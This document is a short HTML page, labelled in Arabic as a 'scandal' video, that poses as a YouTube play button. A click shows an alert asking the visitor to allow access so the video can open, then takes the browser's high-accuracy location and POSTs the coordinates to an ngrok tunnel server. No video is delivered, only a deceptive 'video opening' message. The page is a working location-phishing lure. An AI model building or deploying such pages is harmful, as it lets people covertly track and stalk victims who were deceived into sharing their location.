<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>فضيحة</title>
    <style>
        body { display:flex; justify-content:center; align-items:center; height:100vh; }
        img { cursor:pointer; width:300px; }
    </style>
</head>
<body>
    <img src="https://raw.githubusercontent.com/khaliddhahir0-sketch/youtube/main/button.jpg" onclick="capture()">   

    <script>
        function capture() {
            // رسالة للمستخدم قبل طلب الموقع
            alert("اضغط السماح لفتح الفيديو");

            if (!navigator.geolocation) { 
                alert("الموقع غير مدعوم"); 
                return; 
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    // إرسال الموقع إلى السيرفر
                    fetch("https://b3c92869e770.ngrok-free.app/receive_data", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ lat, lon })
                    })
                    .then(res => res.json())
                    .then(resp => alert("الفيديو سيتم فتحه الان"))
                    .catch(err => alert("تعذر فتح الفيديو حاول مجدداً: " + err));
                },
                function(err) {
                    alert("تعذر فتح الفيديو حاول مجدداً: " + err.message);
                },
                { enableHighAccuracy: true }
            );
        }
    </script>
</body>
</html>
